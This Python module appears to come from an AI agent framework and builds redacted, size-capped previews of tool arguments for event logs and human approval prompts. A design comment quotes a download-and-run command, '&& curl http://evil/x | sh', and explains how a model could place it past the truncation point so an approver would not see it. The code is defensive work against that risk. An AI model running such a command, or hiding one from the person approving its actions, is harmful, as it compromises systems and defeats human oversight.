from __future__ import annotations

from collections.abc import Callable, Mapping
from typing import Any

from monoid_agent_kernel.errors import WorkspaceError
from monoid_agent_kernel.permissions import PermissionPolicy
from monoid_agent_kernel.web import public_query_preview, public_url_preview

REDACTED_PATH = "[redacted-path]"


def public_path(path: str, policy: PermissionPolicy) -> str:
    return REDACTED_PATH if policy.is_path_redacted(path) else path


def public_error_message(error: str) -> str:
    if not error:
        return ""
    if "PRIVATE KEY" in error.upper():
        return "[redacted-sensitive-error]"
    return error


def public_result_content(content: dict[str, Any], policy: PermissionPolicy) -> dict[str, Any]:
    public: dict[str, Any] = {}
    for key, value in content.items():
        if key == "content":
            public[key] = redacted_value(value)
        elif key == "path" and isinstance(value, str):
            public[key] = public_path(value, policy)
        else:
            public[key] = preview_value(key, value, policy)
    return public


def public_capability_result(result: Mapping[str, Any]) -> dict[str, Any]:
    """Return the public view of a capability task result.

    The private task result may carry raw grant material used by the loop to admit a lease.
    Public surfaces only get non-secret lease descriptors and denial state.
    """

    lease = result.get("lease") if isinstance(result.get("lease"), Mapping) else None
    granted = result.get("granted") is True or result.get("approved") is True
    if lease is not None and granted:
        public: dict[str, Any] = {"status": "granted"}
        for key in ("capability", "lease_id", "expires_at"):
            if key in lease:
                public[key] = lease[key]
        if isinstance(lease.get("scope"), Mapping):
            public["scope"] = dict(lease["scope"])
        if result.get("reason"):
            public["reason"] = str(result.get("reason"))
        return public

    public = {"status": "denied", "reason": str(result.get("reason") or "denied")}
    capability = result.get("capability")
    if capability is None and lease is not None:
        capability = lease.get("capability")
    if capability:
        public["capability"] = str(capability)
    return public


def public_proposal_payload(payload: dict[str, Any], policy: PermissionPolicy) -> dict[str, Any]:
    files = [file for file in payload.get("files", []) if isinstance(file, dict)]
    return {
        "path": "proposal.json",
        "mode": payload.get("mode"),
        "proposal_hash": payload.get("proposal_hash"),
        "diff_path": payload.get("diff_path"),
        "diff_bytes": payload.get("diff_bytes"),
        "diff_sha256": payload.get("diff_sha256"),
        "changed_paths": [public_path(str(path), policy) for path in payload.get("changed_paths", [])],
        "files": [public_proposal_file(file, policy) for file in files],
    }


def public_proposal_file(file: dict[str, Any], policy: PermissionPolicy) -> dict[str, Any]:
    path = str(file.get("path", ""))
    redacted = policy.is_path_redacted(path)
    return {
        "path": public_path(path, policy),
        "kind": file.get("kind"),
        "size": file.get("size"),
        "sha256": file.get("sha256"),
        "base_sha256": file.get("base_sha256"),
        "proposed_sha256": file.get("proposed_sha256"),
        "snapshot_sha256": file.get("snapshot_sha256"),
        "change_kind": file.get("change_kind"),
        "snapshot_path": REDACTED_PATH if redacted else file.get("snapshot_path"),
    }


def args_preview(arguments: dict[str, Any], policy: PermissionPolicy) -> dict[str, Any]:
    """The generic trace preview: caps and content-field redaction, and **no secret-name guessing**.

    Deliberately asymmetric with ``core.tool_approval.redact_tool_arguments``, which does mask
    secret-*named* keys. That is not an oversight to bind: ``0109e06`` removed "unconfigurable
    key-name/value guessing" from this module on purpose and made secret redaction beyond content
    fields the integrating backend's job through the ``EventSink`` seam
    (``examples/redacting_event_sink.py``, pinned by ``tests/test_observability.py``). The approval
    record is a different artifact -- a human acts on it directly -- so it masks.

    The consequence is real and worth stating rather than implying otherwise: an ``api_key`` argument
    is masked on an ``ask``-gated call and published verbatim on an ``allow`` call. Anyone who wants
    it masked on both adds the example sink, or does not pass credentials as tool arguments.
    """
    return {key: preview_value(key, value, policy) for key, value in arguments.items()}


# ``run.finish`` arguments that are the model's own prose rather than metadata about the run.
# ``outputs`` is a path list and stays previewed normally.
_FINISH_CONTENT_KEYS = frozenset({"summary", "notes"})


def finish_args_preview(arguments: dict[str, Any], policy: PermissionPolicy) -> dict[str, Any]:
    """Preview for ``run.finish``, whose ``summary`` is the run's final answer.

    Settling through ``run.finish`` is the default flow, so this argument *is* the model-authored
    final text — the same value that reaches ``turn.settled``. Left to the generic preview it was
    copied verbatim into ``tool.call.started.data.args_preview`` (and truncated to a 160-*byte*
    prefix when long), putting model output on `events.jsonl` and every event sink through a
    second door. Removing it from the settle events alone would not have closed the channel.

    Kept out of ``_is_content_field``: that predicate is documented as *file*-content fields, and
    these are model content. Same destination, different reason.

    ``summary`` and ``notes`` are treated alike here but recover differently, which is deliberate.
    ``summary`` becomes ``state.final_text``, so it is written to the run-dir settled-text record
    and hydrated back for entitled readers. ``notes`` has no such route — it is redacted at both
    public seams that carry it (here, and ``arguments_preview`` on the approval request; see
    ``core.tool_approval``) and survives only in ``transcript.jsonl``'s private ``model_turn``
    record. That is the intended destination for model prose; it is not a join-back path, and
    nothing should be built expecting one.

    ``None`` is left alone rather than redacted: ``notes`` is declared ``["string", "null"]``, and
    a redaction marker on an absent value tells an operator something was withheld when nothing
    was there.
    """
    return {
        key: (
            redacted_value(value)
            if value is not None and str(key).lower() in _FINISH_CONTENT_KEYS
            else preview_value(str(key), value, policy)
        )
        for key, value in arguments.items()
    }


def shell_args_preview(arguments: dict[str, Any], policy: PermissionPolicy) -> dict[str, Any]:
    env = arguments.get("env") if isinstance(arguments.get("env"), dict) else {}
    return {
        "command_preview": preview_value("command_preview", str(arguments.get("command") or ""), policy),
        "cwd": preview_value("cwd", arguments.get("cwd", "."), policy),
        "timeout_s": arguments.get("timeout_s"),
        "max_output_bytes": arguments.get("max_output_bytes"),
        "startup_wait_s": arguments.get("startup_wait_s"),
        "background": bool(arguments.get("background", False)),
        "resume_on_exit": bool(arguments.get("resume_on_exit", True)),
        # Previewed, not copied. Env *keys* are model-controlled strings of unbounded length and
        # count: a 20 KB key rode out verbatim here while the same value in a generic argument was
        # capped. This branch withholds env *values* on purpose, so letting the keys carry arbitrary
        # text made it a way to publish exactly what it was withholding.
        "env_keys": preview_value("env_keys", sorted(str(key) for key in env), policy),
    }


def web_args_preview(arguments: dict[str, Any], policy: PermissionPolicy) -> dict[str, Any]:
    """Preview for the web tools, which withhold the query and URL and publish only descriptors.

    Every descriptor below is previewed rather than copied. They are model-controlled strings, and
    copying them raw made this branch a way to publish the very text it exists to withhold: a
    ``locale`` or a ``blocked_domains`` entry carrying 20 KB rode out verbatim in the same event
    whose ``query_preview`` was reduced to a digest. Bypassing the cap is not free just because the
    field sounds like an enum.
    """
    preview: dict[str, Any] = {}
    if "query" in arguments:
        preview["query_preview"] = public_query_preview(str(arguments.get("query") or ""))
    if "url" in arguments:
        preview["url_preview"] = public_url_preview(str(arguments.get("url") or ""))
    for key in (
        "max_results",
        "max_tokens",
        "max_urls",
        "max_snippets",
        "timeout_s",
        "max_bytes",
        "recency_days",
        "locale",
        "format",
    ):
        if key in arguments:
            preview[key] = preview_value(key, arguments[key], policy)
    if "allowed_domains" in arguments:
        preview["allowed_domains"] = preview_value(
            "allowed_domains", arguments.get("allowed_domains") or [], policy
        )
    if "blocked_domains" in arguments:
        preview["blocked_domains"] = preview_value(
            "blocked_domains", arguments.get("blocked_domains") or [], policy
        )
    return preview


# A preview is capped so that a bounded amount of text reaches the event stream, and "bounded" is a
# byte budget — that is what an event log costs and what an operator's redaction promise is about.
# Slicing by *characters* against a *byte* threshold made the cap depend on the language: 100 Hangul
# characters are 300 bytes, so they cleared the 240-byte threshold and were then "truncated" to a
# 160-character prefix, i.e. to all 100 of them. Every multibyte string with at most 160 characters
# and more than 240 bytes was published in full while the payload reported ``truncated: True``.
PREVIEW_BYTE_THRESHOLD = 240
PREVIEW_BYTE_BUDGET = 160
# Bounds on the recursion itself. Nested containers arrive from model-controlled input --
# ``artifact.emit.metadata`` and ``run.update_plan.items`` both declare ``additionalProperties:
# True`` -- so without these a model can hand the writer a structure that costs more to preview than
# the run is worth, or one deep enough to raise ``RecursionError`` inside tool dispatch. The read
# side already learned the depth lesson (``core.schemas`` catches ``RecursionError``); this is the
# write side learning it.
PREVIEW_MAX_DEPTH = 8
PREVIEW_MAX_KEYS = 20
PREVIEW_MAX_ITEMS = 20

# The *decision* surface's budget. An approval preview is read by a person deciding whether to let a
# call run, not by a log reader, and the two want opposite things from a cap. Measured on the trace
# budget: a 341-byte `shell.exec` command was cut at 160 bytes, so `&& curl http://evil/x | sh`
# reached no surface the approver could see -- with the model choosing where in the string to put it.
# That is a strictly worse trade than the egress it buys, because a whole *file body* (the leak this
# release exists to close) is redacted outright by `_is_content_field` regardless of this number.
# So: big enough for any realistic command or argument, still bounded against a pathological one.
APPROVAL_BYTE_THRESHOLD = 4096
APPROVAL_BYTE_BUDGET = 4096

# Keys whose value a renderer prints inline, so the preview has to stay a *string*. Replacing one
# with a `{"preview": ...}` dict renders `[object Object]` -- `WorkspaceInspector.svelte` does
# `{item.step}`, and `svelte-check` cannot catch it because `run-state.ts` casts through `unknown`.
_INLINE_TEXT_KEYS = frozenset({"step"})

# Truncation marker for those keys. A bare prefix would misreport a cut value as the whole value.
TRUNCATION_SUFFIX = "…"


def truncate_to_bytes(value: str, max_bytes: int) -> str:
    """The longest prefix of ``value`` whose UTF-8 encoding fits in ``max_bytes``.

    Backs off to a codepoint boundary. A bare ``value.encode()[:n].decode()`` raises
    ``UnicodeDecodeError`` whenever the cut lands inside a multi-byte sequence, which for non-ASCII
    text is the common case rather than the edge case. ``errors="ignore"`` drops exactly the
    trailing partial sequence and nothing else: the bytes came from encoding a valid ``str``, so the
    only ill-formed run possible is the one the slice created, and UTF-8 is self-synchronizing.

    Shared with ``shell.preview_command`` rather than reimplemented there. The two truncators had
    already drifted to different constants (240/160 here, 240/200 there) while carrying the same
    defect, so a fix applied to one would have left the other publishing whole commands.
    """
    if max_bytes <= 0:
        return ""
    encoded = value.encode("utf-8")
    if len(encoded) <= max_bytes:
        return value
    return encoded[:max_bytes].decode("utf-8", errors="ignore")


class _Unmasked:
    """Sentinel: the mask looked at this value and declined to replace it."""

    def __repr__(self) -> str:  # pragma: no cover - debugging aid
        return "UNMASKED"


UNMASKED = _Unmasked()


def preview_value(
    key: str,
    value: Any,
    policy: PermissionPolicy,
    *,
    mask: Callable[[str, Any], Any] | None = None,
    threshold: int = PREVIEW_BYTE_THRESHOLD,
    budget: int = PREVIEW_BYTE_BUDGET,
    redact_content: bool = True,
    _depth: int = 0,
) -> Any:
    """Bound a value for publication, optionally masking keys the caller names first.

    ``mask`` is consulted at *every* level with that level's key, and returning anything other than
    ``UNMASKED`` replaces the value outright. It exists so that the approval projection can add its
    secret- and prose-key rules to this traversal instead of running a second one:
    ``core.tool_approval.redact_tool_arguments`` had its own recursion carrying the masking rules but
    no caps, while this one had the caps but knew nothing about secrets. Which half of the policy
    applied to a value depended only on which surface it left through. One traversal, all the rules.
    """
    if mask is not None:
        replacement = mask(key, value)
        if replacement is not UNMASKED:
            return replacement
    lowered = key.lower()
    if redact_content and _is_content_field(lowered):
        return redacted_value(value)
    if lowered in {"path", "root", "cwd"} and isinstance(value, str) and _is_path_redacted(value, policy):
        return redacted_value(value)
    if isinstance(value, (dict, list)) and _depth >= PREVIEW_MAX_DEPTH:
        return {"truncated": True, "type": type(value).__name__, "depth_exceeded": PREVIEW_MAX_DEPTH}
    if isinstance(value, dict):
        preview = {
            str(child_key): preview_value(
                str(child_key),
                child_value,
                policy,
                mask=mask,
                threshold=threshold,
                budget=budget,
                redact_content=redact_content,
                _depth=_depth + 1,
            )
            for child_key, child_value in list(value.items())[:PREVIEW_MAX_KEYS]
        }
        # A source key literally named ``truncated_keys`` loses to the marker. Acceptable: the
        # preview is lossy by construction, and no consumer reads nested preview dicts by key --
        # ``narration`` and the Studio activity feed both read only top-level ``args_preview`` keys,
        # which the ``*_args_preview`` builders above assemble themselves and never width-cap.
        if len(value) > PREVIEW_MAX_KEYS:
            preview["truncated_keys"] = len(value) - PREVIEW_MAX_KEYS
        return preview
    if isinstance(value, list):
        # The parent key is reused for each item because list items have no key of their own. A
        # secret-named list is already masked whole before reaching here; what this carries is the
        # mask *down* to dicts inside the list, so ``{"headers": [{"api_key": ...}]}`` still masks.
        items = [
            preview_value(
                key,
                item,
                policy,
                mask=mask,
                threshold=threshold,
                budget=budget,
                redact_content=redact_content,
                _depth=_depth + 1,
            )
            for item in value[:PREVIEW_MAX_ITEMS]
        ]
        if len(value) > PREVIEW_MAX_ITEMS:
            items.append({"truncated_items": len(value) - PREVIEW_MAX_ITEMS})
        return items
    if isinstance(value, str):
        encoded_len = len(value.encode("utf-8"))
        if encoded_len > threshold:
            if lowered in _INLINE_TEXT_KEYS:
                # Stays a string: a renderer prints this one directly.
                return truncate_to_bytes(value, budget) + TRUNCATION_SUFFIX
            return {
                "type": "str",
                "preview": truncate_to_bytes(value, budget),
                "bytes": encoded_len,
                "truncated": True,
            }
        return value
    return value


def _is_path_redacted(value: str, policy: PermissionPolicy) -> bool:
    """``policy.is_path_redacted``, but a path that cannot be normalized counts as redacted.

    ``is_path_redacted`` normalizes before matching, and normalization *raises* on an absolute path
    or a ``..`` traversal — both of which a model can put in a ``path`` argument. Left to propagate,
    that ends the run from inside event construction: the preview builders sit on the emit path, and
    ``WorkspaceError`` escaping there kills a run for an operator whose only mistake was configuring
    ``redact_patterns``. Fail closed rather than open: an argument that does not name a workspace
    path is precisely the kind that should not be published verbatim.
    """
    try:
        return policy.is_path_redacted(value)
    except WorkspaceError:
        return True


def redacted_value(value: Any) -> dict[str, Any]:
    if isinstance(value, str):
        return {"redacted": True, "type": "str", "bytes": len(value.encode("utf-8"))}
    if isinstance(value, bytes):
        return {"redacted": True, "type": "bytes", "bytes": len(value)}
    return {"redacted": True, "type": type(value).__name__}


def _is_content_field(lowered_key: str) -> bool:
    # File-content fields are kept out of the public event stream; full content
    # lives only in the private transcript/proposal artifacts. Secret redaction
    # beyond this (and PermissionPolicy.redact_patterns) is the integrator's job.
    return lowered_key in {"content", "old", "new", "old_text", "new_text"}
